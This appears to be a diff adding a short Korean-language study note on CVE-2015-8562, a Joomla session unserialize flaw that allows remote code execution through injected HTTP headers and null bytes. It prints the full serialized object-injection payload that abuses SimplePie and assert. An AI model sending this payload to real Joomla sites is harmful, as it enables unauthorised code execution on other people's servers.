@@ -1,0 +1,17 @@
+CVE-2015-8562
+
+Unserialize 과정에서 발생, session_id 탈취 및 원격 코드 실행
+
+원격 코드 실행 취약점으로, 세션 데이터(User-Agent, X-Forwarded-For)에 비정상적인 문자열을
+삽입하여 잘못된 세션 핸들러 로직을 통해 데이터베이스(UTF8_general_ci)에 저장되는 취약점
+
+joomla는 HTTP헤더를 세션에 저장함, 이때 Unescaped와 Unsanitized 문자열을 입력받을 수 있다.
+
+세션 데이터는 파일로 저장하지 않고 데이터 베이스에 저장, 이때 세션 변수들을 직렬화한다.
+변수에 Null 바이트(\0\0\0)를 사용하게 되면 직렬화를 변조할 수 있다
+
+}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:
+"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:
+"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));
+JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:
+"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}����
